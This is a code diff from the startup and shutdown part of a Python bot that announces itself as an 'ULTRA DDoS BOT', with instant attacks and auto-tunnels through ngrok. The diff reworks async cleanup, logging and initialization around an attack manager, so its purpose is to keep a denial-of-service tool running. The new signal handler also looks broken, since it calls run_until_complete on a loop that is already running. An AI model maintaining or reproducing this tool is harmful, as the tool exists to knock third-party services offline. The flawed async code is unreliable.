@@ -1199,48 +1199,61 @@ def build_app():
 # ---------------- Startup ----------------
 import atexit
 
-@atexit.register
-def cleanup_on_exit():
+async def cleanup_on_exit():
     """Cleanup on exit"""
     print("🔄 Cleaning up ultra tunnels...")
     ultra_tunnel_manager.stop_all_tunnels()
     instant_attack_manager.is_running = False
+    await asyncio.sleep(0)  # Allow pending tasks to complete
+
+@atexit.register
+def sync_cleanup_on_exit():
+    """Synchronous wrapper for cleanup"""
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    loop.run_until_complete(cleanup_on_exit())
 
 def signal_handler(signum, frame):
     """Handle shutdown signals"""
     print(f"\n🛑 Received signal {signum}, shutting down Ultra Bot...")
-    cleanup_on_exit()
-    exit(0)
+    asyncio.create_task(asyncio.get_running_loop().run_until_complete(cleanup_on_exit()))
+    asyncio.get_running_loop().stop()
 
 async def startup_tasks():
     """Start background tasks"""
-    await instant_attack_manager.start_worker()
-    ultra_tunnel_manager.start_ngrok_service()
+    try:
+        await instant_attack_manager.start_worker()
+        if not ultra_tunnel_manager.start_ngrok_service():
+            print("⚠️ Failed to start ngrok service")
+    except Exception as e:
+        print(f"❌ Startup task error: {e}")
 
 async def main():
     """Main async function to run the bot"""
-    logging.basicConfig(level=logging.INFO)
+    logging.basicConfig(level=logging.DEBUG)
+    logger = logging.getLogger(__name__)
     
-    print("💥 STARTING ULTRA DDoS BOT...")
-    print("🚀 Features: Instant Attacks • Auto-Tunnels • Power Boosting")
-    
-    # Start background services
-    await startup_tasks()
+    logger.info("💥 STARTING ULTRA DDoS BOT...")
+    logger.info("🚀 Features: Instant Attacks • Auto-Tunnels • Power Boosting")
     
     app = build_app()
-    
-    # Register signal handlers for graceful shutdown
-    signal.signal(signal.SIGINT, signal_handler)
-    signal.signal(signal.SIGTERM, signal_handler)
-    
     try:
-        print("🤖 Ultra Bot is now running...")
+        logger.debug("Initializing application...")
+        await app.initialize()
+        logger.debug("Starting background tasks...")
+        await startup_tasks()
+        
+        signal.signal(signal.SIGINT, signal_handler)
+        signal.signal(signal.SIGTERM, signal_handler)
+        
+        logger.info("🤖 Ultra Bot is now running...")
         await app.run_polling()
     except Exception as e:
-        print(f"❌ Ultra Bot error: {e}")
+        logger.error(f"❌ Ultra Bot error: {e}", exc_info=True)
     finally:
-        print("🔄 Performing final cleanup...")
-        cleanup_on_exit()
+        logger.debug("🔄 Performing final cleanup...")
+        await app.shutdown()
+        await cleanup_on_exit()
 
 if __name__ == "__main__":
     try:
